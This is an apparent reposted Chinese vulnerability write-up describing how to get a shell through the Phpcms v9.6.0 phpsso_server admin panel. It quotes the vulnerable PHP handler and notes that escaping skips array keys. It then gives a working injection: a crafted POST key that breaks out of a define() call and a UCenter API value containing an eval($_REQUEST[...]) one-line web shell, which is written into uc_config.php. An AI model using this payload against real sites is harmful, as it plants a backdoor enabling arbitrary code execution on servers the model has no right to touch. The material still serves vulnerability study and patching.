# Phpcms v9.6.0后台getshell

> 原文：[https://www.zhihuifly.com/t/topic/3075](https://www.zhihuifly.com/t/topic/3075)

# Phpcms v9.6.0后台getshell

## 一、漏洞简介

phpsso_server 后台getshell

## 二、漏洞影响

Phpcms v9.6.0

## 三、复现过程

漏洞来自于ROOTDIR/phpsso_server/phpcms/modules/admin/system.php

```
public function uc() {
        if (isset($_POST['dosubmit'])) {
            $data = isset($_POST['data']) ? $_POST['data'] : '';
            $data['ucuse'] = isset($_POST['ucuse']) && intval($_POST['ucuse']) ? intval($_POST['ucuse']) : 0;
            $filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'system.php';
            $config = include $filepath;
            $uc_config = '<?php '."\ndefine('UC_CONNECT', 'mysql');\n";
            foreach ($data as $k => $v) {
                $old[] = "'$k'=>'".(isset($config[$k]) ? $config[$k] : $v)."',";
                $new[] = "'$k'=>'$v',";
                $uc_config .= "define('".strtoupper($k)."', '$v');\n";
            }
            $html = file_get_contents($filepath);
            $html = str_replace($old, $new, $html);
            $uc_config_filepath = CACHE_PATH.'configs'.DIRECTORY_SEPARATOR.'uc_config.php';
            @file_put_contents($uc_config_filepath, $uc_config);
            @file_put_contents($filepath, $html);
            $this->db->insert(array('name'=>'ucenter', 'data'=>array2string($data)), 1,1);
            showmessage(L('operation_success'), HTTP_REFERER);
        }
        $data = array();
        $r = $this->db->get_one(array('name'=>'ucenter'));
        if ($r) {
            $data = string2array($r['data']);
        }
        include $this->admin_tpl('system_uc');
    } 
```

来自这段中的

$data = isset($_POST['data']) ? $_POST['data'] : '';

和

foreach ($data as $k => $v) {
$old[] = "'$k'=>'".(isset($config[$k]) ? $config[$k] : $v)."',";
$new[] = "'$k'=>'$v',";
$uc_config .= "define('".strtoupper($k)."', '$v');\n";
}

这里接收post['data']数据中的key，value并写入配置文件ROOTDIR/phpsso_server/caches/configs/uc_config.php中

在ROOTDIR/phpcms/libs/classes/param.class.php中

```
public function __construct() {
        if(!get_magic_quotes_gpc()) {
            $_POST = new_addslashes($_POST);
            $_GET = new_addslashes($_GET);
            $_REQUEST = new_addslashes($_REQUEST);
            $_COOKIE = new_addslashes($_COOKIE);
        } 
```

全局过滤了post，但是这里只过滤了value，并没有过滤key

![image](img/a514ff83d09f445b5466dd61a583f6c8.png)

在这个地方，我们可以构造

```
name="data[uc_api','11');/*]" 
```

并在Ucenter api 地址输入:

```
*/eval($_REQUEST[test]);// 
```

再进行缓存更新

![image](img/95d050568268424b3d445b0c680bfdae.png)

就成功写入了一句话

![image](img/8ff5796316ea90651c8809933564f136.png)

![image](img/00340effd9c3ceda99bf9aec30d1429e.png)